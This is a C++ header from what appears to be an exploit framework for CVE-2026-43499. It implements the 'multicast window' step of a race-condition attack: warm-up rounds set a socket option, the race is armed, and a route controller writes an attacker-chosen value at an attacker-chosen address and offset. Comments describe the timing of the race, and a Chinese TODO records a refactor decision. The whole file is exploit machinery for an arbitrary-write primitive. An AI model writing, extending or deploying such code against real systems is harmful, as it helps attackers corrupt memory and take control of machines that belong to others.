#pragma once
/** @file backend/cve_2026_43499/landing/multicast_window.hpp
 *  The multicast window body: the thing that is called with the window open and makes the write.
 *
 *  Measured shape of what it stands in for. The old write happens in the waiter thread, at the line
 *  that calls the route controller with the request the race side holds, and the status is read back
 *  afterwards. The route body receives that request and ignores it, so what carries the address and
 *  the value is the request itself and the controller that acts on it, not the route.
 *
 *  So this window does three things and no more: it holds the facts the run was configured with, it
 *  builds one request out of the address, the value and the offset, and it hands that request to the
 *  controller. The controller is a compile-time shape, not an interface: the route type is known at
 *  the call site, so the window is parameterised on it and the call is static. What is being pinned
 *  here is the window's own decisions, and a recording controller lets that happen on the host.
 *
 *  The warm-up rounds live here rather than in the landing because they are part of one attempt: the
 *  old handshake spends its opening rounds setting the socket option without arming and arms only
 *  after them, and a run that arms every round is not the same run. Zero warm-up rounds means the
 *  caller did not say, which is refused by name rather than read as a default.
 */
#include <concepts>
#include <cstddef>
#include <cstdint>

#include "backend/cve_2026_43499/route/multicast_policy.hpp"
#include "backend/cve_2026_43499/landing/multicast_landing.hpp"

namespace ghostlock::backend::cve_2026_43499::landing {
    // TODO(routeexec-compile-time): 机械改动（类型形状）。旧形（原文在 git HEAD）：
    //   `class RouteExec { ~RouteExec(); bool execute(a, v, o) = 0; bool arm(t) = 0; };` —— 析构与
    //   两个接口函数当时都是虚函数（这正是本批要消掉的间接分派）；`class MulticastWindow final :
    //   public Window` 曾以 `RouteExec &` 构造并持有它。
    // 为何：用户裁定「arm/execute 在不在 PI 内不确定 ⇒ 不去证边界 ⇒ 直接改编译期 ⇒ 两头都安全」；
    //   计划 docs/analysis/43499-plan-routeexec-compile-time.md（L 级，已裁 (i)：以具体类型参数化）。
    // 禁回退：不得加回虚分派、不得引入函数指针表（那仍是间接分派）。
    // 完成 = 三线门禁绿 ＋ 真机判据与改动前逐字相同 ＋ Lead/用户确认 ⇒ 删本标注（有界：同批）。

    /** Where a request goes: the route controller, as the old waiter thread reached it. The shape is
     *  a compile-time contract rather than a base class, because the route type is known where the
     *  window is built and the window body must not reach its controller indirectly.
     *  @tparam T The route type: it executes one write and it arms one warm-up round. */
    template <class T>
    concept RouteExec = requires(T &route, std::uint64_t address, std::uint64_t value,
                                 std::uint64_t offset, std::int32_t attempt) {
        { route.execute(address, value, offset) } -> std::same_as<bool>;
        { route.arm(attempt) } -> std::same_as<bool>;
    };

    /** How one attempt ended, in the terms the landing reports. */
    enum class WindowOutcome : unsigned char {
        Wrote = 0,
        /** The limits say the caller never gave a warm-up count. */
        NoWarmUp = 1,
        /** The attempt was armed but the write did not happen. */
        NotLanded = 2,
    };

    /** The window, over the route type it was built for: the calls below are static.
     *  @tparam Exec The route controller, known at the call site. */
    template <RouteExec Exec>
    class MulticastWindow final : public Window {
    public:
        /** @param exec The route controller; borrowed, must outlive this window.
         *  @param limits The warm-up and hold numbers the caller gave. */
        MulticastWindow(Exec &exec, const route::MulticastLimits &limits) noexcept
            : exec_(exec), limits_(limits) {}

        /** One write with the window open. The warm-up comes first, then the armed attempt. */
        [[nodiscard]] bool write_word(std::uint64_t address, std::uint64_t value,
                                      std::uint64_t offset) noexcept override {
            if (limits_.arm_sequence <= 0) {
                outcome_ = WindowOutcome::NoWarmUp;
                return false;
            }
            /* The opening rounds only set the socket option; arming starts after them. */
            for (std::int32_t attempt = 0; attempt < limits_.arm_sequence; ++attempt) {
                if (!exec_.arm(attempt)) {
                    outcome_ = WindowOutcome::NotLanded;
                    return false;
                }
            }
            if (!exec_.execute(address, value, offset)) {
                outcome_ = WindowOutcome::NotLanded;
                return false;
            }
            outcome_ = WindowOutcome::Wrote;
            return true;
        }

        [[nodiscard]] WindowOutcome outcome() const noexcept { return outcome_; }
        /** How many rounds warmed the route, for the record. */
        [[nodiscard]] std::int32_t warm_up_rounds() const noexcept { return limits_.arm_sequence; }

    private:
        Exec &exec_;
        const route::MulticastLimits &limits_;
        WindowOutcome outcome_ = WindowOutcome::NotLanded;
    };
}  // namespace ghostlock::backend::cve_2026_43499::landing
